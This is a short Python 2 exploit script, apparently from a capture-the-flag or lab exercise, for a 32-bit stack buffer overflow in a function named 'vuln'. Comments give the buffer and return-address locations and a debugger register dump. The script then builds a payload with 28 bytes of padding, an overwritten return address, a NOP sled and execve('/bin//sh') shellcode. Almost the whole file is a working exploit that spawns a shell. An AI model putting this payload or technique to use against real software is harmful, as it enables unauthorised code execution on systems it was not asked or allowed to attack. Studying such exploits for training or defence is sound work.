#!/usr/bin/env python2

import struct

# Buffer begins: 0xffffcf60
# EIP Location:  0xffffcf7c
# =========================
#                0x1c (28)

# gef > context regs
"""
$eax   : 0xffffcf60  →  "AAAAAA"                                                                                                                                                                                                           
$ebx   : 0x80e5000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al                                                                                                                                                                    
$ecx   : 0x80e5300  →  <_IO_2_1_stdin_+0> mov BYTE PTR [edx], ah                                                                                                                                                                           
$edx   : 0xffffcf66  →  0x50000800                                                                                                                                                                                                         
$esp   : 0xffffcf7c  →  0x8049e2a  →  <main+89> mov eax, 0x0                                                                                                                                                                               
$ebp   : 0xffffcf98  →  0x00000000                                                                                                                                                                                                         
$esi   : 0x80e5000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al                                                                                                                                                                    
$edi   : 0x80e5000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al                                                                                                                                                                    
$eip   : 0x8049dd0  →  <vuln+59> ret
"""



payload = "AAAABBBBCCCCDDDDEEEEFFFFGGGG"
payload += struct.pack("I",0xffffcf80+30)
payload += "\x90" * 100 
#payload += "\xcc" * 4
payload += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

print(payload)
